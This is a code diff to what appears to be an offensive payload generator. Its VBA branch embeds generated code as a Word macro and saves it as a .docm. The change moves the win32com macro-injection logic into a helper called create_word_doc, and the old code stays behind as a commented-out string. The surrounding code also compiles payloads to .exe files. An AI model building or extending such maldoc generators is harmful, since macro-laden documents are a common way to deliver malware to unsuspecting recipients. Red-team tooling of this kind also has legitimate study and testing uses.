@@ -7,6 +7,7 @@ import sys
 import os
 import subprocess
 import codecs
+from utils.inject import create_word_doc
 
 try:
     import win32com.client
@@ -118,20 +119,21 @@ def main():
         if result.returncode == 0:
             print(f'Payload saved to {args.output}.exe')
     elif args.language == 'vba':
-        if platform.system() == 'Windows':
-            word_app = win32com.client.gencache.EnsureDispatch("Word.Application")
-            word_app.Visible = False
-            word_app.DisplayAlerts = False
-            doc = word_app.Documents.Add()
-            vba_module = doc.VBProject.VBComponents.Add(1)
-            vba_module.CodeModule.AddFromString(formattedCode)
-            out_path = os.path.abspath(f'{args.output}.docm')
-            doc.SaveAs2(out_path, FileFormat=13)
-            doc.Close(SaveChanges=False)
-            word_app.Quit()
-            print(f'Word Doc saved to {args.output}.docm')
-        elif platform.system() == 'Linux':
-            printf('VBA to docm is currently only supported on Windows')
+        """
+        word_app = win32com.client.gencache.EnsureDispatch("Word.Application")
+        word_app.Visible = False
+        word_app.DisplayAlerts = False
+        doc = word_app.Documents.Add()
+        vba_module = doc.VBProject.VBComponents.Add(1)
+        vba_module.CodeModule.AddFromString(formattedCode)
+        out_path = os.path.abspath(f'{args.output}.docm')
+        doc.SaveAs2(out_path, FileFormat=13)
+        doc.Close(SaveChanges=False)
+        word_app.Quit()
+        print(f'Word Doc saved to {args.output}.docm')
+        """
+        result = create_word_doc(formattedCode, f'{args.output}.docm')
+        print(f'Macro saved to {args.output}.docm')
 
 if __name__ == "__main__":
     main()
